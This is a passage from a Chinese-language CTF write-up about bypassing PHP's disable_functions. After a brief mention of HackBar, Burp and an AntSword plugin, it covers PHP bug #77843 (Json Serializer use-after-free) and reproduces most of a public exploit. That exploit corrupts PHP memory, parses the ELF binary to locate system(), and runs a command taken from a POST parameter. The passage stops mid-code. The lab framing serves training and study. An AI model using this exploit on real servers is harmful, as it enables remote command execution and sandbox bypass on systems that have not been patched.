class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/UAF/2.png" alt=""></p><p>利用hackBar或者burp传递post数据就能获取数据</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/UAF/1.png" alt=""></p><h6 id="2-蚁剑-4">2.蚁剑</h6><p>老样子用插件，没什么好说的</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/UAF/3.png" alt=""></p><h5 id="6-Json-Serizlizer-UAF">6.Json Serizlizer UAF</h5><blockquote><p>理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function, 比如 PHP #77843 Json Serializer UAF 漏洞。</p></blockquote><p>题目附件：<a href="https://bugs.php.net/bug.php?id=77843">https://bugs.php.net/bug.php?id=77843</a></p><p>利用json序列化中的堆溢出触发，借以绕过disable_function，影响范围是:<br>7.1 – all versions to date<br>7.2 &lt; 7.2.19 (released: 30 May 2019)<br>7.3 &lt; 7.3.6 (released: 30 May 2019)</p><h6 id="1-手工-2">1.手工</h6><p>exp地址：<a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">8</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$spl1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x18</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$spl1</span>::<span class="variable">$leak</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$y</span>, <span class="variable">$cmd</span>, <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>, <span class="variable">$n_alloc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$contiguous</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$contiguous</span>[] = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$room</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$room</span>[] = <span class="keyword">new</span> <span class="title function_ invoke__">Z</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_protector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$y</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$protector</span> = <span class="string">&quot;.<span class="subst">$_protector</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line">        <span class="variable">$x</span>-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        <span class="variable">$x</span>-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;UAF failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line">        <span class="variable">$spl2</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        <span class="variable">$class_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        <span class="variable">$handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        <span class="variable">$php_heap</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        <span class="variable">$fake_obj</span> = <span class="variable">$abc_addr</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>, <span class="variable">$abc_addr</span>); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak1</span>(<span class="variable">$class_entry</span> + <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        <span class="variable">$fake_tbl_off</span> = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x30</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x38</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$handlers</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span 